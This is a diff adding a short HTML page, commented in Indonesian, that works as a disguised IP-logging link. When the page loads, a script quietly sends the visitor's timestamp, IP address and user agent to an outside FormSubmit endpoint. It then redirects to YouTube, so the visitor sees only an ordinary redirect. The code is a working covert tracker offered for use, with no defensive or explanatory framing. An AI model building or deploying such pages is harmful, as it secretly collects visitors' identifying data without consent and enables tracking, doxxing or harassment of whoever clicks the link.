@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <script>
+    // Kirim data IP ke Google Sheets via FormSubmit
+    fetch('https://formsubmit.co/el/nivero', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        "Timestamp": new Date(),
+        "IP Address": "{{IP}}",  // Akan diisi oleh FormSubmit
+        "User Agent": navigator.userAgent
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      // Redirect setelah data terkirim
+      window.location.href = "https://youtube.com";  // Ganti dengan URL tujuan
+    });
+  </script>
+</body>
+</html>
